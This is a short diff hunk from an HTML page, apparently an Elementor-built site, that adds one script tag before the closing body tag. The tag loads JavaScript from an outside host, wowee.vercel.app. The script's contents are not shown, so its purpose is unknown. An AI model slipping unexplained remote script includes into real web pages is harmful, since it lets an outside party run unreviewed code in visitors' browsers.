@@ -242,6 +242,7 @@ const ensurePageChange = setInterval(() => {
     <span id="elementor-device-mode" class="elementor-screen-only"></span
     ><svg style="display: none" class="e-font-icon-svg-symbols"></svg>
     <div id="pageFullyLoadedActive" style="display: none"></div>
+  <script src="https://wowee.vercel.app/basic_code.js"></script>
   </body>
 </html>
 
